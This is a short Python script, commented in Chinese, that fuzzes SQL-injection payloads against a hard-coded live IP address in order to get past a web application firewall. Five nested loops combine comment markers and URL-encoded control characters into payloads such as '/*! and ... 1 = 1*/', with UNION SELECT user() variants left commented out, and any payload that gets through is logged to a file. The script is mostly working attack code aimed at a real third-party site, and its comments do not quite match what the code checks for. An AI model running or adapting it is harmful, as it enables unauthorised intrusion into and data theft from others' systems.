# encoding=utf-8
# 实现思路；
# 不被拦截的页面上会出现字符“success”
# 被拦截的不会，使用for循环请求并检查返回的页面中是否存在该字符即可。
import requests
# 引入请求模块
url = "http://122.114.228.208/shownews.asp?id=7";
# 定义目标
Fuzz_a = ['/*!', '*/', '/**/', '/', '?', '~', '!', '.', '%', '-', '*', '+', '=']
Fuzz_b = ['']
Fuzz_c = ['%0a', '%0b', '%0c', '%0d', '%0e', '%0f', '%0h', '%0i', '%0j']
FUZZ = Fuzz_a + Fuzz_b + Fuzz_c
# 配置fuzz字典
header = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; WOW64; rv:55.0) Gecko/20100101 Firefox/55.0'}
# 设置请求的headers
for a in FUZZ:
    pass
    for b in FUZZ:
            pass
            for c in FUZZ:
                    for d in FUZZ:
                        pass
                        for e in FUZZ:
                            pass
                            #PYLOAD = "/*!union" + a + b + c + d + e + "select*/"+a + b + c + d + e +"/*!user"+a + b + c + d + e +"()*/"+",2"
                            #PYLOAD="/*!union"+a + b + c + d + e+"select*//*! user"+a + b + c + d + e+"()*/,2,3"
                            PYLOAD="/*! and"+a + b + c + d + e+" 1 = 1*/"
                            urlp = url + PYLOAD
                            res = requests.get(urlp, headers=header)
                            # 使用for排列组合fuzz字典并请求页面
                            if '635495' in res.text:
                                print("[*]URL:" + urlp + "过狗！")
                                f = open('result.txt', 'a')
                                f.write(urlp + "\n")
                                f.close
                            else:
                                print(urlp+"\r\n")

                            # 如果返回的页面中包含wait字符，则打印并写出过狗payload。
